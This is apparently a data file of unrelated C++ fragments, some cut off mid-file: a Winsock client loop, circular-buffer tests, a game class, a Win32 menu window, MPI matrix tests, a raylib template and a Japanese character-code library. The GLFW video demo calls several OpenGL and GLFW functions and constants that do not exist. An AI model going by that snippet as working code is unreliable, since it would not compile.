\u043f\u0440\u0438\u0435\u043c \u0434\u0430\u043d\u043d\u044b\u0445\n\n        if (result > 0) { // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u0441\u0442\u0438 \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445\n            cout << \"Received: \" << result << \" bytes\" << endl; // \u0432\u044b\u0432\u043e\u0434 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438 \u043e \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0435 \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u0431\u0430\u0439\u0442\n            cout << \"Received data: \" << recvBuffer << endl; // \u0432\u044b\u0432\u043e\u0434 \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445\n\n        }\n        else if (result == 0) // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0437\u0430\u043a\u0440\u044b\u0442\u0438\u0435 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\n            cout << \"\\nConnection closed\" << endl; // \u0432\u044b\u0432\u043e\u0434 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e\u0431 \u0437\u0430\u043a\u0440\u044b\u0442\u0438\u0438 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f\n\n    } while (result > 0); // \u043f\u043e\u0432\u0442\u043e\u0440\u0435\u043d\u0438\u0435 \u0446\u0438\u043a\u043b\u0430 \u043f\u0440\u0438 \u0443\u0441\u043f\u0435\u0448\u043d\u043e\u043c \u043f\u0440\u0438\u0435\u043c\u0435 \u0434\u0430\u043d\u043d\u044b\u0445\n    freeaddrinfo(addrResult); // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0430\u043c\u044f\u0442\u0438, \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0439 \u0434\u043b\u044f addrResult\n    WSACleanup(); // \u043e\u0447\u0438\u0441\u0442\u043a\u0430 \u0440\u0435\u0441",
    "#include \"circular_buffer.hpp\"\n\n#include <boost/ut.hpp>\n#include <fmt/format.h>\n#include <fmt/ranges.h>\n\n#include <span>\n#include <vector>\n#include <ranges>\n\nnamespace sr = std::ranges;\nnamespace sv = std::views;\n\nnamespace ut = boost::ut;\nusing namespace ut::literals;\nusing namespace ut::operators;\n\ntemplate <typename T>\nusing CircBuffer = CircularBuffer<T>;\n\nstruct TrivialType\n{\n    int   m_value1;\n    float m_value2;\n\n    auto operator<=>(const TrivialType&) const = default;\n\n    // for fmt::format\n    friend auto          format_as(TrivialType f) { return std::tuple{ f.m_value1, f.m_value2 }; }\n    friend std::ostream& operator<<(std::ostream& os, TrivialType f)\n    {\n        return os << fmt::format(\"{}\", format_as(f));\n    }\n};\n\nstruct NonTrivialType\n{\n    int m_value = 0;\n\n    NonTrivialType() = default;\n\n    NonTrivialType(int value)\n        : m_value{ value }\n    {\n    }\n\n    NonTrivialType(const NonTrivialType& other)\n        : m_value{ other.m_value }\n    {\n    }\n\n    NonTrivialType& operator=(const NonTrivialType& other)\n    {\n        m_value = other.m_value;\n        return *this;\n    }\n\n    NonTrivialType(NonTrivialType&& other) noexcept\n        : m_value{ std::exchange(other.m_value, 0) }\n    {\n    }\n\n    NonTrivialType& operator=(NonTrivialType&& other) noexcept\n    {\n        m_value = std::exchange(other.m_value, 0);\n        return *this;\n    }\n\n    auto operator<=>(const NonTrivialType&) const = default;\n\n    // for fmt::format\n    friend auto          format_as(NonTrivialType f) { return f.m_value; }\n    friend std::ostream& operator<<(std::ostream& os, NonTrivialType f)\n    {\n        return os << fmt::format(\"{}\", format_as(f));\n    }\n};\n\nint main()\n{\n    \"push from empty state but not until full\"_test = [] {\n        CircBuffer<int> circ{ 10 };\n        std::vector     expected{ 1, 2, 3, 4, 5, 6, 0, 0, 0, 0 };    // 6 insertion\n        for (int i = 1; i <= 6; ++i) {\n            circ.push(std::move(i));\n        }\n        ut::expect(circ.size() == 6_ull);\n        ut::expect(sr::equal(circ.buf(), expected));\n    };\n\n    \"push from empty state until full\"_test = [] {\n        CircBuffer<int> circ{ 5 };\n        std::vector     expected{ 1, 2, 3, 4, 5 };    // 5 insertion\n        for (int i = 1; i <= 5; ++i) {\n            circ.push(std::move(i));\n        }\n        ut::expect(circ.size() == 5_ull);\n        ut::expect(sr::equal(circ.buf(), expected));\n    };\n\n    \"push from empty state still push even after full\"_test = [] {\n        CircBuffer<int> circ{ 5 };\n        std::vector     expected{ 6, 7, 3, 4, 5 };    // 7 insertion; 6, 7 will overwrite 1, 2\n        for (int i = 1; i <= 7; ++i) {\n            circ.push(std::move(i));\n        }\n        ut::expect(circ.size() == 5_ull);    // full\n        ut::expect(sr::equal(circ.buf(), expected));\n    };\n\n    \"pop until exhausted but after that the begin pointer is not at the start\"_test = [] {\n        CircBuffer<NonTrivialType>  circ{ 5 };\n        std::vector<NonTrivialType> initial{ 6, 7, 3, 4, 5 };    // 7 insertions\n        std::vector<NonTrivialType> afterPushAfterExhausted{ 0, 0, 8, 0, 0 };\n\n        for (int i = 1; i <= 7; ++i) {\n            circ.push(NonTrivialType{ i });\n        }\n        ut::expect(circ.size() == 5_ull);\n        ut::expect(sr::equal(circ.buf(), initial));\n\n        while (circ.pop() != std::nullopt) { }\n\n        ut::expect(circ.size() == 0_ull);\n        ut::expect(circ.begin() == 2_ull);\n        ut::expect(circ.end() == 2_ull);\n\n        ut::expect(*circ.push(NonTrivialType{ 8 }) == NonTrivialType{ 8 });\n        ut::expect(circ.size() == 1_ull);\n        ut::expect(sr::equal(circ.buf(), afterPushAfterExhausted));\n    };\n\n    \"pop from empty state\"_test = [] {\n        CircBuffer<int> circ{ 5 };\n        ut::expect(circ.pop() == std::nullopt);\n    };\n\n    \"pop from non-empty state but not full for trivial types\"_test = [] {\n        CircBuffer<TrivialType>  circ{ 5 };\n        std::vector<TrivialType> expected{\n            { 1, 1.0f }, { 2, 2.0f }, { 3, 3.0f }, { 4, 4.0f }, { 0, 0.0f }\n        };    // 4 insertion\n\n        for (int i = 1; i <= 4; ++i) {\n            circ.push(TrivialType{ i, static_cast<float>(i) });\n        }\n        ut::expect(circ.size() == 4_ull);\n        ut::expect(sr::equal(circ.buf(), expected));\n\n        ut::expect(*circ.pop() == TrivialType{ 1, 1.0f });\n        ut::expect(circ.size() == 3_ull);\n        ut::expect(sr::equal(circ.buf() | sv::drop(1), expected | sv::drop(1)));\n    };\n\n    \"pop from non-empty state but not full for non-trivial types\"_test = [] {\n        CircBuffer<NonTrivialType>  circ{ 5 };\n        std::vector<NonTrivialType> expected{ { 1 }, { 2 }, { 3 }, { 4 }, {} };    // 4 insertion\n\n        for (int i = 1; i <= 4; ++i) {\n            circ.push(NonTrivialType{ i });\n        }\n        ut::expect(circ.size() == 4_ull);\n        ut::expect(sr::equal(circ.buf(), expected));\n\n        ut::expect(*circ.pop() == NonTrivialType{ 1 });\n        ut::expect(circ.size() == 3_ull);\n        ut::expect(circ.buf()[",
    "#include \"Monster.h\"\n#include \"Golem.h\"\n#include \"Goblin.h\"\n#include \"Slime.h\"\n\n#include <iostream>\n\nusing namespace std;\n\nMonster::Monster(string name, int health, int attack, int defense)\n\t: _name(name), _health(health), _attack(attack), _defense(defense) {}\n\nstring Monster::GetName() {\n\treturn _name;\n}\n\nint Monster::GetHealth() {\n\treturn _health;\n}\n\nvoid Monster::SetHealth(int health) {\n\t_health = health;\n}\n\nint Monster::GetDefense() {\n\treturn _defense;\n}\n\n/*\nvoid Monster::GetDamage(int attack) {\n\tcout << \"Monster::GetDamage()\" << endl;\n\tint damage = attack - _defense;\n\n\tif (damage <= 0) {\n\t\tdamage = 0;\n\t}\n\n\t_health -= damage;\n}\n*/\n\nvoid Monster::Attack(Monster& enemy) {\n\n\tenemy.GetDamage(_attack);\n\n\tcout << \"Monster::Attack(Monster)\" << endl;\n\tcout << _name << \"\uac00 \" << enemy._name << \"\uc744 \uacf5\uaca9\ud574\uc11c \uc0dd\uba85\ub825\uc774 \" << enemy._health << \"\ub85c \uc904\uc74c.\" << endl;\n\n}\n\nvoid Monster::Info() {\n\tcout << \"\uc774\ub984: \" << _name << endl;\n\tcout << \"\uc0dd\uba85\ub825: \" << _health << endl;\n\tcout << \"\ubc29\uc5b4\ub825: \" << _defense << endl;\n\tcout << \"\uacf5\uaca9\ub825: \" << _attack << endl;\n}",
    "#include <windows.h>\n#include <tchar.h>\n#include <cmath>\n#include <string>\n\n/*   CONFIG DATA   */\nbool GetDataFromXvirtualMachine__ = true;\nbool V86Mode__ = true;\nbool LoadOSInstenseFromXvirtualMachine__ = true;\nbool AllStartupInterfaceLoaded__ = true;\nbool SafeLoad__ = true;\n/*   CONFIG DATA   */\nbool LoadStartupOS__;\n\nbool isFullscreen = false;\nbool isCursorHidden = false;\nWINDOWPLACEMENT prevWindowPlacement = { sizeof(WINDOWPLACEMENT) };\nDWORD prevWindowStyle;\nRECT prevWindowRect;\n\n//Xvirtual\nHWND __STARTUP_MSG__;\nHWND __ENTERED_MSG__;\nHWND __STARTUP_OK__;\nHWND __STARTUP_OK2__;\nHWND __GetExcuteFiles_xVirtual__;\nHWND __LOGO_Xvirtual__;\nHWND __VLOGO_Xvirtual__;\nHWND __SLOGO_Xvirtual__;\nHWND __SELECTLINE1_OS__;\nHWND __SELECTLINE2_OS__;\nHWND __SELECTLINE3_OS__;\nHWND __SELECTLINE4_OS__;\nHWND __SELECTLINE5_OS__;\nHWND __SELECTOS1_OS__;\nHWND __SELECTOS2_OS__;\nHWND __SELECTOS3_OS__;\nHWND __SELECTCS1_OS__;\nHWND __SELECTCS2_OS__;\nHWND __SELECTCS3_OS__;\nHWND __EMPTY_DISPLAY__;\nHWND __EMPTY2_DISPLAY__;\nHWND __EMPTY3_DISPLAY__;\nHWND __EMPTY_DISPLAY_LOGO__;\n//Xvirtual\n\nHFONT __STARTUP_FONT__;\nHFONT __LOGO_FONT_Xvirtual__;\nHFONT __SELECT_FONT_Xvirtual__;\n\nHBRUSH hbrBkgnd = NULL;\n\nLRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);\n\nint selectedOSIndex = 0;\nHWND selectOSWindows[3];\n\nint APIENTRY wWinMain(\n    HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow)\n{\n    static wchar_t szAppName[] = L\"Xvirtual OS Machine\";\n    HWND           hWnd;\n    MSG            msg;\n    WNDCLASS       wndclass = {};\n\n    wndclass.style = CS_HREDRAW | CS_VREDRAW;\n    wndclass.lpfnWndProc = WndProc;\n    wndclass.hInstance = hInstance;\n    wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);\n    wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);\n    wndclass.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(0, 0, 0));\n    wndclass.lpszClassName = szAppName;\n\n    if (!RegisterClass(&wndclass))\n    {\n        return EXIT_FAILURE;\n    }\n\n    hWnd = CreateWindowW(\n        szAppName,\n        L\"MyOS\",\n        WS_OVERLAPPEDWINDOW,\n        CW_USEDEFAULT,\n        CW_USEDEFAULT,\n        CW_USEDEFAULT,\n        CW_USEDEFAULT,\n        NULL,\n        NULL,\n        hInstance,\n        NULL);\n    ShowWindow(hWnd, nCmdShow);\n    UpdateWindow(hWnd);\n\n    while (GetMessage(&msg, NULL, 0, 0))\n    {\n        TranslateMessage(&msg);\n        DispatchMessage(&msg);\n    }\n\n    return msg.wParam;\n}\n\nvoid ToggleFullscreen(HWND hwnd) {\n    if (isFullscreen) {\n        // Restore the window to its previous style and position\n        SetWindowLong(hwnd, GWL_STYLE, prevWindowStyle);\n        SetWindowPlacement(hwnd, &prevWindowPlacement);\n        SetWindowPos(hwnd, NULL, prevWindowRect.left, prevWindowRect.top, prevWindowRect.right - prevWindowRect.left, prevWindowRect.bottom - prevWindowRect.top,\n            SWP_NOZORDER | SWP_NOOWNERZORDER | SWP_FRAMECHANGED);\n        isFullscreen = false;\n    }\n    else {\n        // Save the current window style and position\n        prevWindowStyle = GetWindowLong(hwnd, GWL_STYLE);\n        GetWindowPlacement(hwnd, &prevWindowPlacement);\n        GetWindowRect(hwnd, &prevWindowRect);\n\n        // Set the window style to borderless and maximize it to full screen\n        SetWindowLong(hwnd, GWL_STYLE, prevWindowStyle & ~WS_OVERLAPPEDWINDOW);\n        int screenWidth = GetSystemMetrics(SM_CXSCREEN);\n        int screenHeight = GetSystemMetrics(SM_CYSCREEN);\n        SetWindowPos(hwnd, NULL, 0, 0, screenWidth, screenHeight, SWP_NOZORDER | SWP_NOOWNERZORDER | SWP_FRAMECHANGED);\n        isFullscreen = true;\n    }\n}\n\nvoid ShowCursor(bool show) {\n    if (show) {\n        while (ShowCursor(TRUE) < 0);\n        isCursorHidden = false;\n    }\n    else {\n        while (ShowCursor(FALSE) >= 0);\n        isCursorHidden = true;\n    }\n}\n\nvoid UpdateSelectionDisplay() {\n    for (int i = 0; i < 3; ++i) {\n        if (i == selectedOSIndex) {\n            SetBkColor(GetDC(selectOSWindows[i]), RGB(100, 100, 100));\n            SetWindowText(selectOSWindows[i], L\"       NAME                    For Xvirtual OS Machine               \");\n        }\n        else {\n            SetBkColor(GetDC(selectOSWindows[i]), RGB(50, 50, 50));\n            SetWindowText(selectOSWindows[i], L\"       NAME                    For Xvirtual OS Machine               \");\n        }\n    }\n}\n\nvoid ClearScreen(HWND hWnd) {\n    HWND hChild = GetWindow(hWnd, GW_CHILD);\n    while (hChild) {\n        HWND hNextChild = GetWindow(hChild, GW_HWNDNEXT);\n        DestroyWindow(hChild);\n        hChild = hNextChild;\n    }\n}\n\nLRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    HDC         hDC;\n    PAINTSTRUCT ps;\n    RECT        rect;\n    LOGFONT lf = {};\n    HWND hwndStatic = (HWND)lParam;\n\n    switch (message)\n    {\n    case WM_KEYDOWN:\n        if (wParam == VK_ESCAPE) {\n            ToggleFullscreen(hWnd);\n        }\n        else if (wParam == VK_DOWN) {\n            selectedOSIndex = (selectedOSIndex + 1) % 3;\n            UpdateSelectionDisplay();\n        }\n        els",
    "#include \"matrix_multiplication.h\"\n#include <fstream>\n#include <iostream>\n#include <vector>\n#include <time.h>\n#include <stdlib.h>\n#include <gtest/gtest.h>\n#include <mpi.h>\n\n/*\n * Method to automatically execute tests\n */\nstd::vector<std::vector<int>> executeTest(std::vector<std::vector<int>>& A, std::vector<std::vector<int>>& B){\n    int rank, size;\n    MPI_Comm_rank(MPI_COMM_WORLD, &rank);\n    MPI_Comm_size(MPI_COMM_WORLD, &size);\n\n    int rowsA, colsA, rowsB, colsB;\n    rowsA = A.size();\n    colsA = A[0].size();\n    rowsB = B.size();\n    colsB = B[0].size();\n\n    MPI_Bcast(&rowsA, 1, MPI_INT, 0, MPI_COMM_WORLD);\n    MPI_Bcast(&colsA, 1, MPI_INT, 0, MPI_COMM_WORLD);\n    MPI_Bcast(&rowsB, 1, MPI_INT, 0, MPI_COMM_WORLD);\n    MPI_Bcast(&colsB, 1, MPI_INT, 0, MPI_COMM_WORLD);\n\n\n    if (rank != 0) {\n        A.resize(rowsA, std::vector<int>(colsA));\n    }\n    for (int i = 0; i < rowsA; ++i) {\n        MPI_Bcast(A[i].data(), colsA, MPI_INT, 0, MPI_COMM_WORLD);\n    }\n\n\n    if (rank != 0) {\n        B.resize(rowsB, std::vector<int>(colsB));\n    }\n    for (int i = 0; i < rowsB; ++i) {\n        MPI_Bcast(B[i].data(), colsB, MPI_INT, 0, MPI_COMM_WORLD);\n    }\n\n    std::vector<std::vector<int>> C(rowsA, std::vector<int>(colsB, 0));\n    multiplyMatrices(A, B, C, rowsA, colsA, colsB);\n\n    return C;\n}\n\n\n// ######################### Source code of multiplyMatrices in src/matrix_mult\n\n/*\n * Tests copied form SE4HPC_project_part1_Cesaroni-Tonarelli-Trabacchin\n */\nTEST(MatrixMultiplicationTest, TestAssociativePropertyMatrices) {\n    int n = 10;\n    std::srand((unsigned)std::time(NULL));\n    std::vector<std::vector<int>> A(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> B(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> C(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> temp(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> result1(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> result2(n, std::vector<int>(n, 0));\n\n    for(int i=0; i<n; i++){\n        for(int j=0; j<n; j++){\n            A[i][j] = std::rand() % 10;\n            B[i][j] = std::rand() % 10;\n            C[i][j] = std::rand() % 10;\n        }\n    }\n\n    // (AB)C\n    temp = executeTest(A, B);\n    result1 = executeTest(temp, C);\n    // A(BC)\n    temp = executeTest(B, C);\n    result2 = executeTest(A, temp);\n\n    ASSERT_EQ(result1, result2) << \"Associativity Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, TestIdentityElementMatrices) {\n    int n = 9;\n    std::srand((unsigned)std::time(NULL));\n    std::vector<std::vector<int>> A(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> I(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> result1(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> result2(n, std::vector<int>(n, 0));\n    for(int i=0; i<n; i++){\n        for(int j=0; j<n; j++){\n            A[i][j] = std::rand() % 10;\n            if(i==j){\n                I[i][j] = 1;\n            }\n        }\n    }\n    // AI\n    result1 = executeTest(A, I);\n    // IA\n    result2 = executeTest(I, A);\n\n    ASSERT_EQ(result1, result2) << \"Identity Element Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, TestNullElementMatrices) {\n    int n = 8;\n    std::srand((unsigned)std::time(NULL));\n    std::vector<std::vector<int>> A(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> zero(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> result1(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> result2(n, std::vector<int>(n, 0));\n\n    for(int i=0; i<n; i++){\n        for(int j=0; j<n; j++){\n            A[i][j] = std::rand() % 10;\n        }\n    }\n\n    result1 = executeTest(A, zero);\n\n    ASSERT_EQ(result1, zero) << \"Null Element Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, TestRandom1Matrices) {\n    int n = 5;\n    std::vector<std::vector<int>> A(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> B(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> C(n, std::vector<int>(n, 0));\n\n    for(int i=0; i<n; i++){\n        for(int j=0; j<n; j++){\n            A[i][j]=i+1;\n            if(i==j){\n                B[i][j]=1;\n            }\n        }\n    }\n\n    C = executeTest(A, B);\n\n    ASSERT_EQ(C, A) << \"Random1 Element Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, TestRandom2Matrices) {\n    int n = 8;\n    std::vector<std::vector<int>> A(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> B(n, std::vector<int>(n, 0));\n    std::vector<std::vector<int>> C(n, std::vector<int>(n, 0));\n\n    for(int i=0; i<n; i++){\n        for(int j=0; j<n; j++){\n            A[i][j]=j+1;\n            if(i==j){\n                B[i][j]=1;\n            }\n        }\n    }\n\n    C = executeTest(A, B);\n\n    ASSERT_EQ(C, A) << \"Random2 Element Matrix multiplication test failed! :(((()\";\n}\n\nTEST(MatrixMultiplicationTest, TestRandomRectangularMatrices) {\n    size_t rowA",
    "#include <iostream>\n#include <string>\n#include <GLFW.glfw3.h>\n#include \"vluminance/luminance.hpp\"\n\nint main(){\n    GLFWwindow* window;\n    if(!glfwInit())\n        Luminant::video_frame_msg(\"INIT_ERR\");\n    window = glfwCreateWindow(Luminant::getLwidth(), Luminant::getLheight(), \"sample_title\", nullptr, nullptr);\n    if(!window)\n        Luminant::video_frame_msg(\"WIND_ERR\");\n    \n    int framewidth, frameheight; unsigned char* framedata;\n    if(!Luminant::video_frame(\"file_location\", &framewidth, &frameheight, framedata)) return false;\n    glfwMakeContextCurrent(window);\n    GLuint* vtex;\n    glGenTextures(1, &vtex);\n    glBindTextures(GL_TEXTURE_2D, vtex);\n    glPixelStorei(GL_UNPACK_ALIGNMENT, 1);\n\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAX_FILTER, GL_LINEAR);\n\n    glTexImage2d(GL_TEXTURE_2D, 0 , GL_RGB, Luminant::getLwidth(), Luminant::getLheight(), 0 , GL_RGBA, GL_UNSIGNED_BYTES, framedata);\n    while(!glfwShouldWindowClose(window)){\n        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n        glEnable(GL_TEXTURE_2D);\n        glBegin(GL_QUADS);\n            glTexCoord2d(0,0); glVertex2i(0,0);\n            glTexCoord2d(1,0); glVertex2i(framewidth, 0);\n            glTexCoord2d(1,1); glVertex2i(framewidth, frameheight);\n            glTexCoord2d(0,1); glVertex2i(0, frameheight);\n        glEnd();\n        glDisable(GL_TEXTURE_2D);\n        glfwWaitEvents();\n    }\n    return 0;\n}\n\n",
    "#include \"raylib.h\"\n\n#include \"common.h\"\n\n#include \"imgui.h\"\n#include \"rlImGui.h\"\n\n#if defined(PLATFORM_WEB)\n#include <emscripten/emscripten.h>\n#endif\n\nvoid UnloadGameplayScreen();\nvoid InitGameplayScreen();\nvoid UpdateGameplayScreen();\nvoid DrawGameplayScreen();\nvoid DrawGameplayScreen();\nvoid ImGuiGameplayScreen();\n\nstatic const int screenWidth = 800;\nstatic const int screenHeight = 450;\n\nstatic void UpdateDrawFrame(void); // Update and draw one frame\n\nint main(void) {\n#if defined(PLATFORM_WEB)\n  SetConfigFlags(FLAG_WINDOW_RESIZABLE);\n#else\n  SetConfigFlags(FLAG_VSYNC_HINT);\n#endif\n  InitWindow(screenWidth, screenHeight, \"raylib game template\");\n\n  TraceLog(LOG_INFO, \"window size: %d %d\", GetScreenWidth(), GetScreenHeight());\n\n  rlImGuiSetup(true);\n  InitGameplayScreen();\n\n#if defined(PLATFORM_WEB)\n  emscripten_set_main_loop(UpdateDrawFrame, 0, 1);\n#else\n  while (!WindowShouldClose()) // Detect window close button or ESC key\n  {\n    UpdateDrawFrame();\n  }\n#endif\n\n  UnloadGameplayScreen();\n  rlImGuiShutdown();\n\n  CloseWindow();\n  return 0;\n}\n\nvoid ImGuiMain() {}\n\nstatic void UpdateDrawFrame(void) {\n  UpdateGameplayScreen();\n\n  BeginDrawing();\n  ClearBackground(COLOR_DARK);\n\n  DrawGameplayScreen();\n\n  Color color = LIME; // Good FPS\n  int fps = GetFPS();\n  float frame_time = 1.0 / (float)fps;\n\n  if ((fps < 30) && (fps >= 15))\n    color = ORANGE; // Warning FPS\n  else if (fps < 15)\n    color = RED; // Low FPS\n\n  DrawText(TextFormat(\"FPS: %2i\", fps), 10, 10, 20, color);\n  DrawText(TextFormat(\"ms: %.1f\", frame_time * 1000), 10, 30, 20, color);\n\n  rlImGuiBegin();\n  ImGuiGameplayScreen();\n  rlImGuiEnd();\n\n  EndDrawing();\n}\n",
    "// ============================================================================\n//\n//\t\t\u30ad\u30e3\u30e9\u30af\u30bf\u30b3\u30fc\u30c9\u95a2\u4fc2\u306e\u30e9\u30a4\u30d6\u30e9\u30ea\n//\n//\t\tCreator\t\t\t: \u5c71\u7530\u3000\u5de7\n//\t\tCreation Data\t: 09/17/2004\n//\n// ============================================================================\n\n// include --------------------------------------\n\n#include \"DataType.h\"\n#include \"CharCode.h\"\n#include \"FileLib.h\"\n#include <malloc.h>\n#include <string.h>\n#include <stdarg.h>\n#include <math.h>\n#include <float.h>\n\n#if defined(WIN32) || defined(WIN64)\n#include <Windows.h>\n#endif\n\n// define ---------------------------------------\n\n// \u66f8\u5f0f\u6587\u5b57\u5217\u306e\u30b5\u30a4\u30ba\u6307\u5b9a\u30d7\u30ec\u30d5\u30a3\u30c3\u30af\u30b9\n#define PRINTF_SIZE_PREFIX_h\t\t(0)\n#define PRINTF_SIZE_PREFIX_l\t\t(1)\n#define PRINTF_SIZE_PREFIX_ll\t\t(2)\n#define PRINTF_SIZE_PREFIX_w\t\t(3)\n#define PRINTF_SIZE_PREFIX_I\t\t(4)\n#define PRINTF_SIZE_PREFIX_I32\t\t(5)\n#define PRINTF_SIZE_PREFIX_I64\t\t(6)\n\n// \u66f8\u5f0f\u6587\u5b57\u5217\u306e\u578b\u6307\u5b9a\n#define PRINTF_TYPE_c\t\t\t\t(0)\n#define PRINTF_TYPE_C\t\t\t\t(1)\n#define PRINTF_TYPE_d\t\t\t\t(2)\n#define PRINTF_TYPE_i\t\t\t\t(3)\n#define PRINTF_TYPE_o\t\t\t\t(4)\n#define PRINTF_TYPE_u\t\t\t\t(5)\n#define PRINTF_TYPE_x\t\t\t\t(6)\n#define PRINTF_TYPE_X\t\t\t\t(7)\n#define PRINTF_TYPE_e\t\t\t\t(8)\n#define PRINTF_TYPE_E\t\t\t\t(9)\n#define PRINTF_TYPE_f\t\t\t\t(10)\n#define PRINTF_TYPE_g\t\t\t\t(11)\n#define PRINTF_TYPE_G\t\t\t\t(12)\n#define PRINTF_TYPE_a\t\t\t\t(13)\n#define PRINTF_TYPE_A\t\t\t\t(14)\n#define PRINTF_TYPE_n\t\t\t\t(15)\n#define PRINTF_TYPE_p\t\t\t\t(16)\n#define PRINTF_TYPE_s\t\t\t\t(17)\n#define PRINTF_TYPE_S\t\t\t\t(18)\n#define PRINTF_TYPE_Z\t\t\t\t(19)\n#define PRINTF_TYPE_NUM\t\t\t\t(20)\n\n#define MIN_COMPRESS\t\t(4)\t\t\t\t\t\t// \u6700\u4f4e\u5727\u7e2e\u30d0\u30a4\u30c8\u6570\n#define MAX_SEARCHLISTNUM\t(64)\t\t\t\t\t// \u6700\u5927\u4e00\u81f4\u9577\u3092\u63a2\u3059\u70ba\u306e\u30ea\u30b9\u30c8\u3092\u8fbf\u308b\u6700\u5927\u6570\n#define MAX_SUBLISTNUM\t\t(65536)\t\t\t\t\t// \u5727\u7e2e\u6642\u9593\u77ed\u7e2e\u306e\u305f\u3081\u306e\u30b5\u30d6\u30ea\u30b9\u30c8\u306e\u6700\u5927\u6570\n#define MAX_COPYSIZE \t\t(0x1fff + MIN_COMPRESS)\t// \u53c2\u7167\u30a2\u30c9\u30ec\u30b9\u304b\u3089\u30b3\u30d4\u30fc\u51fa\u5207\u308b\u6700\u5927\u30b5\u30a4\u30ba( \u5727\u7e2e\u30b3\u30fc\u30c9\u304c\u8868\u73fe\u3067\u304d\u308b\u30b3\u30d4\u30fc\u30b5\u30a4\u30ba\u306e\u6700\u5927\u5024 + \u6700\u4f4e\u5727\u7e2e\u30d0\u30a4\u30c8\u6570 )\n#define MAX_ADDRESSLISTNUM\t(1024 * 1024 * 1)\t\t// \u30b9\u30e9\u30a4\u30c9\u8f9e\u66f8\u306e\u6700\u5927\u30b5\u30a4\u30ba\n#define MAX_POSITION\t\t(1 << 24)\t\t\t\t// \u53c2\u7167\u53ef\u80fd\u306a\u6700\u5927\u76f8\u5bfe\u30a2\u30c9\u30ec\u30b9( 16MB )\n\n// \u521d\u671f\u5316\u30c1\u30a7\u30c3\u30af\n#define CHARCODETABLE_INITCHECK( CharCodeFormat )\t\t\\\n\tswitch( (CharCodeFormat) )\\\n\t{\\\n\tcase CHARCODEFORMAT_SHIFTJIS\t:\\\n\t\tif( g_CharCodeSystem.InitializeCharCodeCP932InfoFlag == FALSE )\\\n\t\t{\\\n\t\t\tSetupCharCodeCP932TableInfo() ;\\\n\t\t}\\\n\t\tbreak ;\\\n\\\n\tcase CHARCODEFORMAT_GB2312 :\\\n\t\tif( g_CharCodeSystem.InitializeCharCodeCP936InfoFlag == FALSE )\\\n\t\t{\\\n\t\t\tSetupCharCodeCP936TableInfo() ;\\\n\t\t}\\\n\t\tbreak ;\\\n\\\n\tcase CHARCODEFORMAT_UHC :\\\n\t\tif( g_CharCodeSystem.InitializeCharCodeCP949InfoFlag == FALSE )\\\n\t\t{\\\n\t\t\tSetupCharCodeCP949TableInfo() ;\\\n\t\t}\\\n\t\tbreak ;\\\n\\\n\tcase CHARCODEFORMAT_BIG5 :\\\n\t\tif( g_CharCodeSystem.InitializeCharCodeCP950InfoFlag == FALSE )\\\n\t\t{\\\n\t\t\tSetupCharCodeCP950TableInfo() ;\\\n\t\t}\\\n\t\tbreak ;\\\n\\\n\tcase CHARCODEFORMAT_WINDOWS_1252 :\\\n\t\tif( g_CharCodeSystem.InitializeCharCodeCP1252InfoFlag == FALSE )\\\n\t\t{\\\n\t\t\tSetupCharCodeCP1252TableInfo() ;\\\n\t\t}\\\n\t\tbreak ;\\\n\\\n\tcase CHARCODEFORMAT_ISO_IEC_8859_15 :\\\n\t\tif( g_CharCodeSystem.InitializeCharCodeISO_IEC_8859_15InfoFlag == FALSE )\\\n\t\t{\\\n\t\t\tSetupCharCodeISO_IEC_8859_15TableInfo() ;\\\n\t\t}\\\n\t\tbreak ;\\\n\t}\n\n// data type ------------------------------------\n\n// 